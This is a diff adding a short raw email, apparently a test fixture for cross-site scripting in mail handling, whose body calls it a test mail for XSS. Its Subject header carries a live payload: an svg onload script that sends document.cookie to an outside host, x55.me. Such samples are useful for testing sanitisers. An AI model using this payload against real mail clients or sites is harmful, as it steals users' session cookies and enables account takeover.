@@ -1,0 +1,7 @@
+From: "Manager" <jujugtvibic@blueangel.com.hk>
+To: user@alum.mit.edu, user@alumni.eecs.berkeley.edu,
+Subject: <svg onload='img=new Image();img.src="//x55.me/geo.php?get="+document.cookie;'>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
